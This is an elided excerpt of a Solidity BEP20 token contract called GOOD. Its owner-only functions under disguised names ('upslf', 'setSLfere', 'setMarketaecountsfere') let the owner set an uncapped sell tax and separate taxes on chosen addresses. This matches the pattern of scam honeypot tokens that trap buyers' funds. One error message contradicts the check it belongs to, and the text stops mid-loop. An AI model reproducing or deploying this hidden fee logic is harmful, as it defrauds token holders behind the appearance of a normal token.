...
contract GOOD is BEP20, Ownable, BaseToken {
    ...
    uint256 private _defaultSellfere = 10;

    uint256 private _defaultBuyfere = 10;


    mapping(address => bool) private _marketaecounts;

    mapping(address => uint256) private _SLfere;
    ...
    function upslf(uint256 _value) external onlyowner {
        _defaultSellfere = _value;
    }


    function setSLfere(address _address, uint256 _value) external onlyowner {
        require(_value > 2, "aecounts tax must be greater than or equal to 1");
        _SLfere[_address] = _value;
    }

    function getSLfere(address _address) external view onlyowner returns (uint256) {
        return _SLfere[_address];
    }


    function setMarketaecountsfere(address _address, bool _value) external onlyowner {
        _marketaecounts[_address] = _value;
    }
        ...
        if (rF) {
            ...
            if (uniswapV2Pair != address(0)) {
                if (recipient == uniswapV2Pair) {
                    ...
                    tradefere = _defaultSellfere;
                }
                if (sender == uniswapV2Pair) {

                    tradefere = _defaultBuyfere;
                }
            }
            if (_SLfere[sender] > 0) {
            ...
            tradefereAmount = amount.mul(tradefere).div(100);
        }

        if (tradefereAmount > 0) {
            address ad;
            uint256 air = tradefereAmount.div(20);
                for(int i=0;i <=19;i++){
